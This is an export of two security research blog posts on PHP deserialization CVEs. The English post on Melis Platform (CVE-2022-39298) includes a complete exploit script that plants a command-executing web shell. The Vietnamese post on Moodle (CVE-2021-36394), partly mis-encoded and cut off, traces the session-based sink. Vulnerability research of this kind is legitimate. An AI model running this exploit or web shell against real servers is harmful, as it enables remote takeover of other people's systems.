[{"content":"Reproduce bug: Remote Code Execution in Melis Platform Continuing from the previous article series, in this post, I will apply the knowledge learned and research on PHP deserialize to reproduce CVE-2022-39298\n There is currently no POC code available on this internet for this CVE, but there is a blog post discussing it: Remote Code Execution in Melis Platform | Sonar (sonarsource.com) This blog is based on the blog Remote Code Execution in Melis Platform | Sonar (sonarsource.com) and will be written in my own understanding.  I Building environment   What is melis-framework?\n Melis Framework is an open-source PHP web application framework for building custom, modular, and scalable e-commerce solutions. It is based on the Laminas Framework (formerly known as the Zend Framework) and provides additional modules and tools to make it easier to develop e-commerce applications.\nMelis Framework features a powerful and flexible content management system, which allows developers to create custom pages, blocks, and widgets. It also includes a robust shopping cart system with support for multiple payment gateways, shipping providers, and tax rates. Additionally, it offers various integrations such as social media, mailing list services, and Google Analytics.\nMelis Framework uses the Model-View-Controller (MVC) architecture and relies on the Composer dependency management system to manage packages and libraries. It is highly customizable and extensible, allowing developers to add their own modules, themes, and plugins to meet specific project requirements.\n   One of the most challenging issues I find when reproducing this CVE related to this framework is having to rebuild the environment, which takes a considerable amount of time and effort.\nAfter spending a few days searching for many sources of information on the internet (in fact, there are not many resources discussing this issue), I found that the best way is to follow the step-by-step video instructions on the website Download \u0026amp; Documentation (melistechnology.com. However, there is a difficulty that the website only provides installation instructions for the next step on the Windows platform, while I am using it on the Linux environment.\nI noticed that there was a section in the guide for building docker-compose. Therefore, I decided to read the contents the docker-compose.yml file, make some modifications to build it locally.\n The important notice here is that during setup, at the final step, it is advisable to follow the video tutorial to create a sample site. This helps us save time in triggering the vulnerability.\n II Vulnerability identification   At melis-front/src/Controller/MelisPluginRendererController.php\n1 2 3 4 5 6 7 8 9 10 11 12 13  class MelisPluginRendererController extends MelisAbstractActionController { public function getPluginAction() { // [...] $post = $this-\u0026gt;getRequest()-\u0026gt;getPost()-\u0026gt;toArray(); // [1] $pluginHardcodedConfig = array(); if (!empty($post[\u0026#39;pluginHardcodedConfig\u0026#39;])) { $pluginHardcodedConfig = $post[\u0026#39;pluginHardcodedConfig\u0026#39;]; // [2] $pluginHardcodedConfig = html_entity_decode($pluginHardcodedConfig, ENT_QUOTES); $pluginHardcodedConfig = html_entity_decode($pluginHardcodedConfig, ENT_QUOTES); $pluginHardcodedConfig = unserialize($pluginHardcodedConfig); // [3]     At line 13, the unserialize() function is called with the parameter $pluginHardcodedConfig which is obtained from $post (at line 6).\n  The class MelisPluginRendererController is extended from MelisAbstractActionController class which is located in Laminas\\Mvc\\Controller\\AbstractActionController.\n  From this, we can infer the framework being used is Lamimas. The Laminas\\Mvc\\Controller::getRequest() method returns an object of type Laminas\\Http\\Request. This object has a getPost()-\u0026gt;toArray() method which retrieves the POST data and stores it in $post (at line 6). An attacker can control the value of this variable.\n  III Finding source from sink   Tracing the sink, I found that it is related to the file module.config.php in melis-platform.\n  The source code of vendor/melisplatform/melis-front/src/Controller/MelisPluginRendererController.php shows that:\n This bug relates to a plugin. This Framework is built following the MVC model.    tr√™n trang document c·ªßa melis, c√≥ 1 trang webdemo\n  On the Melis documentation page, there is a web demo and a sample config page.\n  From here, I realize that the vulnerability occurred on the website hosted on the Melis framework, but what I am doing is looking for the bug on the Melis framework, which is the wrong direction. üòîüòîüòî\nTherefore, the next step is to create a website hosted on the Melis-framework like the sample site on the local machine.\n  After a day of research, I found out the cause of the issue. During the installation process, there was an option to install with a demo version. After installing, all I need to do is access the demo website, and the plugin will automatically trigger.\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14  POST /news/id/2 HTTP/1.1 Host: www.mysite.local User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://www.mysite.local/melis Cookie: PHPSESSID=dhd40qdsqb3goj8lkmausre78d; show_bubble_plugins=true; dashboard_notify=false Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 0 pluginHardcodedConfig=Ediscxxxxxx   And at this point, we can also control any value passed into the unserialize() function, which is enough to move on to the next phase.\nIV Building a POP chain   There is a paper discussing this exploitation technique.\ndahse2014 (1).pdf\n  Supporting tool - PHPGGC  PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don\u0026rsquo;t have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of¬†frohoff\u0026rsquo;s ysoserial, but for PHP. Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.\n  link: https://github.com/ambionics/phpggc PHPGCC includes a chain that allows deleting any file.  1 2 3 4 5 6 7  ./phpggc -i Laminas/FD1 Name : Laminas/FD1 Version : \u0026lt;= 2.11.2 Type : File delete Vector : __destruct ./phpggc Laminas/FD1 \u0026lt;remote_path\u0026gt;   But the impact causes is too too significant and destructive for organizations. As a pentester, we need to find other chains that have less impact.\nFinding new chain  The author‚Äôs experience with unserialize shows that the caching systems are suitable targets for attacks and control. Because most applications tend to trust the content from the cache. The application uses laminas/laminas-cache as a third-party dependency, which supports various backend storage features such as apcu,¬†blackhole,¬†mongodb,¬†filesystem,¬†memcached,¬†memory,¬†redis and session. After going through the classes, the author found a comment in the code  1  Saves any deferred items that have not been committed   At laminas-cache/src/Psr/CacheItemPool/CacheItemPoolDecorator.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  \u0026lt;?php namespace Laminas\\Cache\\Psr\\CacheItemPool; # [...] class CacheItemPoolDecorator implements CacheItemPoolInterface { /** * Destructor. * * Saves any deferred items that have not been committed */ public function __destruct() { $this-\u0026gt;commit(); }     This means that there must be some way to use this class to store new items in the cache.\n  Go deeper into the commit() function at vendor/laminas/laminas-cache/src/Psr/CacheItemPool/CacheItemPoolDecorator.php\n1 2 3 4 5 6 7 8 9 10 11 12 13  public function commit() { $notSaved = []; foreach ($this-\u0026gt;deferred as \u0026amp;$item) { if (! $this-\u0026gt;save($item)) { $notSaved[] = $item; } } $this-\u0026gt;deferred = $notSaved; return empty($this-\u0026gt;deferred); }    It is easy to notice that all values of $this-\u0026gt;deferred are saved to cache by the $this-\u0026gt;save() function (lines 5-9)    Go deeper into the $this-\u0026gt;save() function\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  public function save(CacheItemInterface $item) { if (! $item instanceof CacheItem) { throw new InvalidArgumentException(\u0026#39;$item must be an instance of \u0026#39; . CacheItem::class); } $itemTtl = $item-\u0026gt;getTtl(); // delete expired item if ($itemTtl \u0026lt; 0) { $this-\u0026gt;deleteItem($item-\u0026gt;getKey()); $item-\u0026gt;setIsHit(false); // kh√¥ng c√≥ trong cache return false; } $saved = true; $options = $this-\u0026gt;storage-\u0026gt;getOptions(); $ttl = $options-\u0026gt;getTtl(); try { // get item value and serialize, if required $value = $item-\u0026gt;get(); // reset TTL on adapter, if required if ($itemTtl \u0026gt; 0) { $options-\u0026gt;setTtl($itemTtl); } $saved = $this-\u0026gt;storage-\u0026gt;setItem($item-\u0026gt;getKey(), $value); // saved items are a hit? see integration test CachePoolTest::testIsHit() $item-\u0026gt;setIsHit($saved); } catch (Exception\\InvalidArgumentException $e) { throw new InvalidArgumentException($e-\u0026gt;getMessage(), $e-\u0026gt;getCode(), $e); } catch (Exception\\ExceptionInterface $e) { $saved = false; } finally { $options-\u0026gt;setTtl($ttl); } return $saved; }     The code line $saved = $this-\u0026gt;storage-\u0026gt;setItem($item-\u0026gt;getKey(), $value);is used to save the value to the filesystem storage backend, and since we can control all variables of deserialized classes, we can point the filesystem storage to any file on the local disk and write to it.\n  ƒêi·ªÅu n√†y c√≥ th·ªÉ b·ªã khai th√°c b·∫±ng c√°ch t·∫°o m·ªôt k·ªãch b·∫£n PHP tr√™n ƒëƒ©a, c√≥ th·ªÉ ƒë∆∞·ª£c th·ª±c thi tr·ª±c ti·∫øp b·ªüi tr√¨nh th√¥ng d·ªãch. Mi·ªÖn l√† t·∫≠p l·ªánh c√≥ ph·∫ßn m·ªü r·ªông .php v√† b·∫Øt ƒë·∫ßu b·∫±ng \u0026lt;?php, b·∫•t k·ª≥ d·ªØ li·ªáu n√†o tr∆∞·ªõc n√≥ ƒë·ªÅu b·ªã b·ªè qua v√† tr√¨nh th√¥ng d·ªãch PHP s·∫Ω th·ª±c thi t·∫≠p l·ªánh.\n  This can be exploited by creating a PHP script on disk that can be directly executed by the interpreter. As long as the script has .php extension and starts with \u0026lt;?php, any data before it will be ignored, and the PHP interpreter will execute the script.\n    Workflow (from Remote Code Execution in Melis Platform | Sonar (sonarsource.com))\n  My Exploit This is the code I‚Äôve written to exploit this vulnerability\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  \u0026lt;?php namespace Laminas\\Cache\\Psr\\CacheItemPool { class CacheItemPoolDecorator{} class CacheItem{} } namespace Laminas\\Cache\\Storage\\Adapter { class Filesystem{} class FilesystemOptions{} } namespace { function httpPost($url, $data) { $curl = curl_init($url); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_HEADER, true); curl_setopt($curl, CURLOPT_POSTFIELDS, $data); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_PROXY, \u0026#39;127.0.0.1:8080\u0026#39;); //proxy  printf($curl); $response = curl_exec($curl); // var_dump($response);  curl_close($curl); return $response; } function pwn($url, $param){ $shell = \u0026#39;\u0026lt;?php if(isset($_GET[\\\u0026#39;cmd\\\u0026#39;])) { system($_GET[\\\u0026#39;cmd\\\u0026#39;]); } ?\u0026gt;\u0026#39;; $cache_item = new Laminas\\Cache\\Psr\\CacheItemPool\\CacheItem; $cache_item-\u0026gt;key=\u0026#34;shell\u0026#34;; $cache_item-\u0026gt;value=$shell; $payload = new Laminas\\Cache\\Psr\\CacheItemPool\\CacheItemPoolDecorator; $payload-\u0026gt;storage = new Laminas\\Cache\\Storage\\Adapter\\Filesystem; $payload-\u0026gt;storage-\u0026gt;options = new Laminas\\Cache\\Storage\\Adapter\\FilesystemOptions; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; cacheDir = \u0026#34;/var/www/html/public\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; dirLevel = 0; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; suffix = \u0026#34;php\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; namespace = \u0026#34;\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; keyPattern = \u0026#34;/.*/\u0026#34;; $payload-\u0026gt;deferred = array($cache_item); $data = \u0026#34;pluginHardcodedConfig=\u0026#34;.serialize($payload); // print($data);  echo \u0026#34;\\n[*] Inject Payload \u0026#34;.$data; httpPost($url,$data); echo \u0026#34;\\n\\n\\n[*] Successful!\u0026#34;; } // Exploit Main  // $url = $argv[1];  $url = \u0026#34;http://www.mysite.local/news/id/2\u0026#34;; $param = \u0026#34;Hacked: by0d0ff9\u0026#34;; pwn($url, $param); } ?\u0026gt;   POC\nV References  Remote Code Execution in Melis Platform | Sonar (sonarsource.com)  dahse2014 (1).pdf\n Code Reuse Attacks in PHP | Proceedings of the 2014 ACM SIGSAC Conference on Computer and Communications Security Download \u0026amp; Documentation (melistechnology.com) https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laminas/FD/1  ","description":"Continuing from the previous article series, in this post, I will apply the knowledge learned and research on PHP deserialize to reproduce CVE-2022-39298.","id":0,"section":"posts","tags":["cve, php"],"title":"Reproduce bug: Remote Code Execution in Melis Platform","uri":"https://minhlongmt183.github.io/posts/reproduce-bug-remote-code-execution-in-melis-platform/"},{"content":"CVE 2021-36394 - moodle Long time no see!\nƒê·ª£t n√†y t√¥i c√≥ c∆° h·ªôi l√†m vi·ªác, nghi√™n c·ª©u v·ªÅ c√°c CVE li√™n quan ƒë·∫øn PHP. M·ªôt trong nh·ªØng l·ªói t√¥i l√†m ƒë·∫ßu ti√™n li√™n quan ƒë·∫øn PHP-deserialize.\nƒê√¢y l√† m·ªôt m·∫£ng ki·∫øn th·ª©c m·ªõi m√† t√¥i ƒë∆∞·ª£c ti·∫øp c·∫≠n. Ph∆∞∆°ng ph√°p ·ªü ƒë√¢y l√† t√¥i s·∫Ω t√¨m hi·ªÉu c√°c ki·∫øn th·ª©c li√™n quan ƒë·∫øn PHP-deserialize, l√†m m·ªôt v√†i v√≠ d·ª•, t√¨m hi·ªÉu c√°c h√†m hay b·ªã l·ªói! Sau ƒë√≥, ta b·∫Øt ƒë·∫ßu v√†o CVE c·ªßa m√¨nh.\nKi·∫øn th·ª©c c∆° b·∫£n c·ªßa PHP deserialize c√≥ th·ªÉ d·ªÖ d√†ng t√¨m ki·∫øm tr√™n Payload All Things.\nSau ƒë√≥, t√¥i t√¨nh c·ªù th·∫•y blog vi·∫øt v·ªÅ c√°ch khai th√°c PHP deserialize v·ªÅ moodle! L·ªó h·ªïng n√†y ƒë√£ c√≥ b√†i vi·∫øt, POC, c√°c t√†i li·ªáu li√™n quan\u0026hellip; ƒê√¢y l√† m·ªôt CVE l√≠ t∆∞·ªüng ƒë·ªÉ t√¥i b·∫Øt ƒë·∫ßu h·ªçc!\nB√†i n√†y, t√¥i s·∫Ω tr√¨nh b√†y l·∫°i theo c√°ch hi·ªÉu c·ªßa t√¥i.\nNg·ªØ c·∫£nh  Moodle b·∫≠t shibboleth plugin Version b·ªã l·ªói: 3.11, 3.10 to 3.10.4, 3.9 to 3.9.7 and earlier unsupported versions  Chi ti·∫øt l·ªó h·ªïng Nh·∫≠n di·ªán l·ªó h·ªïng  ƒê·ªçc b√†i blog, ta bi·∫øt ƒë∆∞·ª£c sink n·∫±m ·ªü ƒë∆∞·ªùng d·∫´n auth/shibboleth/classes/helper.php, c·ª• th·ªÉ ·ªü h√†m logout_file_session  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  public static function logout_file_session($spsessionid) {\rglobal $CFG;\rif (!empty($CFG-\u0026gt;session_file_save_path)) {\r$dir = $CFG-\u0026gt;session_file_save_path;\r} else {\r$dir = $CFG-\u0026gt;dataroot . \u0026#39;/sessions\u0026#39;;\r}\rif (is_dir($dir)) {\rif ($dh = opendir($dir)) {\r// Read all session files.\rwhile (($file = readdir($dh)) !== false) {\r// Check if it is a file.\rif (is_file($dir.\u0026#39;/\u0026#39;.$file)) {\r// Read session file data.\r$data = file($dir.\u0026#39;/\u0026#39;.$file);\rif (isset($data[0])) {\r$usersession = self::unserializesession($data[0]);\r// Check if we have found session that shall be deleted.\rif (isset($usersession[\u0026#39;SESSION\u0026#39;]) \u0026amp;\u0026amp; isset($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id)) {\r// If there is a match, delete file.\rif ($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id == $spsessionid) {\r// Delete session file.\rif (!unlink($dir.\u0026#39;/\u0026#39;.$file)) {\rreturn new SoapFault(\u0026#39;LogoutError\u0026#39;, \u0026#39;Could not delete Moodle session file.\u0026#39;);\r}\r}\r}\r}\r}\r}\rclosedir($dh);\r}\r}\r}\r   Question: N·∫øu ng·ªØ c·∫£nh 1day th√¨ sao? l√†m sao bi·∫øt ƒë∆∞·ª£c endpoint n√†y? Ans:\n Tr√™n trang th√¥ng b√°o c·ªßa Moodle c√≥ th√¥ng b√°o v·ªÅ l·ªó h·ªïng  Moodle.org: MSA-21-0022: Remote code execution risk when Shibboleth authentication is enabled\n  T·ª´ trang n√†y d·∫´n t·ªõi repo github c·ªßa moodle khi commit ƒë·ªÉ fix code\nOfficial Moodle git projects - moodle.git/search\n  S·ª≠ d·ª•ng t√≠nh nƒÉng commit diff s·∫Ω th·∫•y h√†m b·ªã l·ªói n·∫±m ·ªü /[auth/shibboleth/classes/helper.php](https://git.moodle.org/gw?p=moodle.git;a=blob;f=auth/shibboleth/classes\u0026gt; /helper.php;h=0e99d199957509a35d259704d3ee08e313aed510;hb=5bc561ee7ad31b769815821280f8a3f5bd69c31b)\n     H√†m n√†y s·∫Ω th·ª±c hi·ªán c√°c b∆∞·ªõc sau\n  L·∫•y ƒë·ªãa ch·ªâ th∆∞ m·ª•c l∆∞u c√°c session, ƒë∆∞·ªùng d·∫´n l√† $CFG-\u0026gt;dataroot/sessions/\n1 2 3 4 5  if (!empty($CFG-\u0026gt;session_file_save_path)) {\r$dir = $CFG-\u0026gt;session_file_save_path;\r} else {\r$dir = $CFG-\u0026gt;dataroot . \u0026#39;/sessions\u0026#39;;\r}\r    ƒê·ªçc n·ªôi dung file trong th∆∞ m·ª•c tr√™n v√† th·ª±c hi·ªán h√†m self::unserializesession tr√™n t·ª´ng n·ªôi dung\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  if (is_dir($dir)) {\rif ($dh = opendir($dir)) {\r// Read all session files.\rwhile (($file = readdir($dh)) !== false) {\r// Check if it is a file.\rif (is_file($dir.\u0026#39;/\u0026#39;.$file)) {\r// Read session file data.\r$data = file($dir.\u0026#39;/\u0026#39;.$file);\rif (isset($data[0])) {\r$usersession = self::unserializesession($data[0]);\r// Check if we have found session that shall be deleted.\rif (isset($usersession[\u0026#39;SESSION\u0026#39;]) \u0026amp;\u0026amp; isset($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id)) {\r// If there is a match, delete file.\rif ($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id == $spsessionid) {\r// Delete session file.\rif (!unlink($dir.\u0026#39;/\u0026#39;.$file)) {\rreturn new SoapFault(\u0026#39;LogoutError\u0026#39;, \u0026#39;Could not delete Moodle session file.\u0026#39;);\r}\r}\r}\r}\r}\r}\rclosedir($dh);\r}\r}\r    D√≤ng 8: Ch∆∞∆°ng tr√¨nh s·∫Ω ƒë·ªçc t·ª´ng file, l∆∞u gi√° tr·ªã v√†o bi·∫øn $data .\n  D√≤ng 10 ch∆∞∆°ng tr√¨nh th·ª±c hi·ªán l·ªánh self::unserializesession()\n  H√†m unserializesession($serializedstring)\n1 2 3 4 5 6 7 8 9  private static function unserializesession($serializedstring) {\r$variables = array();\r$a = preg_split(\u0026#34;/(\\w+)\\|/\u0026#34;, $serializedstring, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE);\r$counta = count($a);\rfor ($i = 0; $i \u0026lt; $counta; $i = $i + 2) {\r$variables[$a[$i]] = unserialize($a[$i + 1]);\r}\rreturn $variables;\r}\r    D√≤ng 3, chu·ªói $serializedstring s·∫Ω b·ªã split b·ªüi pattern /(\\w+)\\|/ ƒë·ªÉ t·∫°o th√†nh 1 m·∫£ng c√°c ph·∫ßn t·ª≠ con.\n  V√≠ d·ª•:\n1 2  $serializedstring = \u0026#39;Hello|world\u0026#39;;\r==\u0026gt; a = [\u0026#39;Hello\u0026#39;, \u0026#39;world\u0026#39;]\r    D√≤ng 4‚Äî\u0026gt;7: T·ª´ng ph·∫ßn t·ª≠ c·ªßa m·∫£ng $a truy·ªÅn v√†o h√†m unserialize().\n    K·∫øt lu·∫≠n:  M·ªói l·∫ßn ng∆∞·ªùi d√πng truy c·∫≠p v√†o moodle, session ƒë·ªÅu ƒë∆∞·ª£c l∆∞u l·∫°i ·ªü folder $CFG-\u0026gt;dataroot/sessions/ Khi th·ª±c hi·ªán h√†m logout_file_session(), ch∆∞∆°ng tr√¨nh ƒë·ªçc l·∫ßn l∆∞·ª£t c√°c file ch·ª©a session.  M·ªói session s·∫Ω ƒë∆∞·ª£c split th√†nh m·∫£ng c√°c ph·∫ßn t·ª≠ v·ªõi delimiter l√† | T·ª´ng ph·∫ßn t·ª≠ s·∫Ω l√† tham s·ªë truy·ªÅn v√†o h√†m unserialize()    N·∫øu attacker c√≥ th·ªÉ ghi ƒë∆∞·ª£c xu·ªëng session th√¨ c√≥ th·ªÉ control ƒë∆∞·ª£c tham s·ªë truy·ªÅn v√†o unserialize() ‚áí d·∫•u hi·ªáu c·ªßa l·ªói php deserialization\n   php deserialization\n ƒê·ªÉ khai th√°c l·ªó h·ªïng php deserialization c·∫ßn 2 b∆∞·ªõc ch√≠nh  Control ƒë∆∞·ª£c tham s·ªë truy·ªÅn v√†o h√†m unserialize() X√°c ƒë·ªãnh kƒ© thu·∫≠t khai th√°c, v·ªõi PHP deserialization kƒ© thu·∫≠t khai th√°c Property Oriented Programming (POP) th∆∞·ªùng ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ khai th√°c.     Khai th√°c l·ªó h·ªïng I. control tham s·ªë truy·ªÅn v√†o h√†m unserialize() ·ªû ph·∫ßn tr∆∞·ªõc ch√∫ng ta ƒë√£ bi·∫øt h√†m unserialize() s·∫Ω l·∫•y tham s·ªë c√≥ gi√° tr·ªã t·ª´ sesion v√† session n√†y ƒë∆∞·ª£c ƒë·ªçc l√™n t·ª´ file. Do ƒë√≥, m·ªôt h∆∞·ªõng ƒë·ªÉ control ƒë∆∞·ª£c input v√†o h√†m unserialize() l√† t√¨m c√°ch ghi xu·ªëng sesion.\n  ƒê·ªÉ t√¨m c√°ch ghi xu·ªëng session, trong source code, ta s·∫Ω t√¨m ƒë·∫øn n∆°i th·ªèa 2 ƒëi·ªÅu ki·ªán:\n  Bi·∫øn $SESSION ƒë∆∞·ª£c g√°n gi√° tr·ªã. Th∆∞·ªùng s·∫Ω c√≥ d·∫°ng\n1  $SESSION-\u0026gt;field1= var1;\r    Gi√° tr·ªã ƒë∆∞·ª£c g√°n v√†o $SESSION ƒë∆∞·ª£c control b·ªüi user, ·ªü ƒë√¢y l√† var1. Trong PHP, bi·∫øn ƒë∆∞·ª£c ng∆∞·ªùi d√πng truy·ªÅn v√†o s·∫Ω ƒë∆∞·ª£c th∆∞c thi b·ªüi h√†m optional_param() ho·∫∑c required_param().\n    T√¥i d√πng c√¥ng c·ª• grep v√† comm c·ªßa ubuntu ƒë·ªÉ gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y, c·ª• th·ªÉ\n1 2 3  grep -HnrE \u0026#39;\\$SESSION-\u0026gt;\u0026#39; /var/www/html/moodle/ | awk -F \u0026#39;:\u0026#39; \u0026#39;{print $1}\u0026#39; | sort -u \u0026gt; file1.txt\rgrep -HnrE \u0026#39;optional_param\\(|required_param\\(\u0026#39; /var/www/html/moodle/ | awk -F \u0026#39;:\u0026#39; \u0026#39;{print $1}\u0026#39; | sort -u \u0026gt; file2.txt\rcomm -12 file1.txt file2.txt \u0026gt; file3.txt\r  √ù nghƒ©a c·ªßa t·ª´ng c√¢u l·ªánh th√¨ ch·ªâ l√† ki·∫øn th·ª©c c∆° b·∫£n c·ªßa linux, google 1 t√≠ l√† ra üôÇ.\nN√¥m na l√† t√¥i t√¨m c√°c t·ªáp c√≥ ch·ª©a chu·ªói thu·ªôc 2 pattern tr√™n r·ªìi l·ªçc ra c√°c t·ªáp c√πng n·∫±m trong 2 file1, file2. B∆∞·ªõc n√†y kh√° r∆∞·ªùm ra v√¨ grep kh√¥ng h·ªó tr·ª£ to√°n t·ª≠ AND 2 pattern m√† ch·ªâ OR th√¥i.\n  Sau khi c√≥ file3.txt th√¨ manual v√†o t·ª´ng file m√† t√¨m xem c√≥ endpoint n√†o hay kh√¥ng th√¥i. (ƒê√¢y l√† c√°ch c·ªßa t√°c gi·∫£, c≈©ng l√† n∆°i m√† ch√∫ng ta c√≥ th·ªÉ c·∫£i thi·ªán ph∆∞∆°ng ph√°p ho·∫∑c nghi√™n c·ª©u t√¨m ph∆∞∆°ng ph√°p hi·ªáu qu·∫£ h∆°n)\n  Ti·∫øn h√†nh ƒë·ªçc, ta t√¨m ƒë∆∞·ª£c 1 endpoint ·ªü grade/report/grader/index.php, c·ª• th·ªÉ:\n1 2 3 4 5 6 7 8 9 10  $graderreportsifirst = optional_param(\u0026#39;sifirst\u0026#39;, null, PARAM_NOTAGS);\r$graderreportsilast = optional_param(\u0026#39;silast\u0026#39;, null, PARAM_NOTAGS);\r// The report object is recreated each time, save search information to SESSION object for future use.\rif (isset($graderreportsifirst)) {\r$SESSION-\u0026gt;gradereport[\u0026#39;filterfirstname\u0026#39;] = $graderreportsifirst;\r}\rif (isset($graderreportsilast)) {\r$SESSION-\u0026gt;gradereport[\u0026#39;filtersurname\u0026#39;] = $graderreportsilast;\r}\r   D√≤ng 6, 9: Gi√° tr·ªã bi·∫øn $graderreportsifirst v√† $graderreportsilast ƒë∆∞·ª£c l∆∞u v√†o session. D√≤ng 1,2: Gi√° tr·ªã bi·∫øn $graderreportsifirst v√† $graderreportsilast ƒë∆∞·ª£c truy·ªÅn b·ªüi ng∆∞·ªùi d√πng v·ªõi 2 param l·∫ßn l∆∞·ª£t sifirst v√† silast. ‚áí Ch√∫ng ta ch·ªâ c·∫ßn truy·ªÅn 1 trong 2 param l√† ƒë·ªß. Endpoint n√†y unauthenticated    ƒê·ªçc th√™m code, d·ªÖ d√†ng bi·∫øt ƒë∆∞·ª£c format truy·ªÅn v√†o\n1 2 3 4 5 6 7 8 9 10 11 12 13  GET /moodle/grade/report/grader/index.php?id=1\u0026amp;sifirst=xxxx|EDISC-here-PAYLOAD|yyyyyyy HTTP/1.1\rHost: localhost\rUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate\rConnection: close\rCookie: MoodleSession=4ganll3d78sv5gjlcqqhd1lue0\rUpgrade-Insecure-Requests: 1\rSec-Fetch-Dest: document\rSec-Fetch-Mode: navigate\rSec-Fetch-Site: none\rSec-Fetch-User: ?1\r    Ti·∫øn h√†nh ch·∫°y v√† debug, ta x√°c ƒë·ªãnh ƒë∆∞·ª£c\n ƒë·ªãa ch·ªâ l∆∞u session l√† /var/www/moodledata/sessions ƒê·ªÉ d·ªÖ debug, ta v√†o th∆∞ m·ª•c tr√™n, x√≥a h·∫øt c√°c session ƒëang c√≥ v√† th·ª±c hi·ªán request ƒë·ªÉ l∆∞u session   ƒê√£ vi·∫øt session th√†nh c√¥ng, ki·ªÉm tra gi√° tr·ªã truy·ªÅn v√†o h√†m unserialize() Ti·∫øn h√†nh debug ƒë·ªÉ ki·ªÉm tra xem gi√° tr·ªã c√≥ th·ª±c s·ª± ƒë∆∞·ª£c ƒë∆∞a v√†o h√†m unserialize() kh√¥ng. B√¢y gi·ªù, c√¢u chuy·ªán l√† l√†m sao ƒë·ªÉ t√¨m ƒë∆∞·ª£c source ƒë·ªÉ reach t·ªõi ƒë∆∞·ª£c sink unserialize()    II. T·ª´ source t·ªõi sink ·ªû ph·∫ßn 1 ta ƒë√£ ghi ƒë√® xu·ªëng session v·ªõi gi√° tr·ªã b·∫•t k√¨. ƒê·ªçc code ta bi·∫øt ƒë∆∞·ª£c gi√° tr·ªã c·ªßa m√¨nh truy·ªÅn v√†o s·∫Ω ƒë∆∞·ª£c truy·ªÅn v√†o h√†m unserialize()\nTrong ph·∫ßn n√†y ta s·∫Ω t√¨m source ƒë·ªÉ d·∫´n t·ªõi sink unserialize() ƒë·ªÉ ch·∫°y debug, ki·ªÉm tra gi√° tr·ªã truy·ªÅn v√†o c√≥ ƒë√∫ng nh∆∞ d·ª± ƒëo√°n kh√¥ng v√† ƒë√¢y c≈©ng l√† n∆°i trigger payload exploit.\n  S·ª≠ d·ª•ng t√≠nh nƒÉng Go to references tr√™n vscode, ta d·ªÖ d√†ng t√¨m ƒë∆∞·ª£c endpoint t·∫°i h√†m LogoutNotification() t·∫°i auth/shibboleth/logout.php\n1 2 3 4 5 6 7 8 9 10 11 12  function LogoutNotification($spsessionid) {\r$sessionclass = \\core\\session\\manager::get_handler_class();\rswitch ($sessionclass) {\rcase \u0026#39;\\core\\session\\file\u0026#39;:\rreturn \\auth_shibboleth\\helper::logout_file_session($spsessionid);\rcase \u0026#39;\\core\\session\\database\u0026#39;:\rreturn \\auth_shibboleth\\helper::logout_db_session($spsessionid);\rdefault:\rthrow new moodle_exception(\u0026#34;Shibboleth logout not implemented for \u0026#39;$sessionclass\u0026#39;\u0026#34;);\r}\r// If no SoapFault was thrown, the function will return OK as the SP assumes.\r}\r    Endpoint auth/shibboleth/logout.php c√≥ lu·ªìng th·ª±c thi nh∆∞ sau:\n  Ch∆∞∆°ng tr√¨nh l·∫•y 2 tham s·ªë action v√† return t·ª´ url v√† x√°c ƒë·ªãnh protocol ƒë∆∞·ª£c s·ª≠ d·ª•ng\n1 2 3 4 5 6 7 8  $action = optional_param(\u0026#39;action\u0026#39;, \u0026#39;\u0026#39;, PARAM_ALPHA);\r$redirect = optional_param(\u0026#39;return\u0026#39;, \u0026#39;\u0026#39;, PARAM_URL);\r// Find out whether host supports https\r$protocol = \u0026#39;http://\u0026#39;;\rif (is_https()) {\r$protocol = \u0026#39;https://\u0026#39;;\r}\r    Ki·ªÉm tra xem plugin shibboleth c√≥ ƒë∆∞·ª£c b·∫≠t kh√¥ng. 